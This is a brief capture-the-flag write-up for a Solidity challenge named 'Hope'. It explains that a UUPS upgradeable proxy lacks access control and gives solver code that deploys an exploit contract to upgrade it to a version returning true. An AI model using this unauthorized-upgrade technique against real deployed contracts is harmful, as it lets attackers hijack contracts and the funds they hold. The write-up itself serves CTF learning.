# Hope

TL;DR (very quick one):
1. See the Contract have `UUPSUpgradeable`
2. Notice that no access control is being implemented
3. Just upgrade the Contract to the one that returning true
4. below are the solver

```solidity
        Exploit exp = new Exploit(payable(address(setupInstance)));
        exp.exploit();

        address falsehope = address(exp.FH());

        bytes memory getHopeVersionCall = abi.encodeCall(Hope.getHopeVersion, ());
        (bool success, bytes memory returnData) = address(hopeProxy).call(getHopeVersionCall);
        require(success, "Call to getHopeVersion failed");
        uint256 hopeVersion = abi.decode(returnData, (uint256));

        console.log(hopeVersion);
        console.log(setupInstance.isSolved());
```
5. Exploit contract are basically the Hope contract with a slight change to return `true`.

# Ref
